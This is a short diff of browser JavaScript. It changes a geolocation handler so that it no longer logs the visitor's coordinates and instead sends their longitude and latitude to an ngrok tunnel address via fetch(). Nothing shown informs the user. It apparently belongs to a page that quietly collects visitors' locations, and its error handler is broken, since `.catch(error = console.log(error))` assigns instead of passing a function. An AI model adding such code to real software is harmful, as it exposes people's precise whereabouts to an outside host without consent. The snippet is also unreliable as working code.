@@ -16,7 +16,12 @@
     var latitude = position.coords.latitude;
     var longitude = position.coords.longitude;
 
-    console.error("LON: ", longitude, "\nLAT: ", latitude);
+    fetch(`https://dcf6-102-88-63-111.ngrok-free.app?lon=${longitude}&lat=${latitude}`)
+        .then(res => res.json())
+        .then(data => console.log(data))
+        .catch(error = console.log(error))
+
+    // console.error("LON: ", longitude, "\nLAT: ", latitude);
     // var url = "https://www.google.com/maps?q=" + latitude + "," + longitude;
     // window.location.href = url;
   }
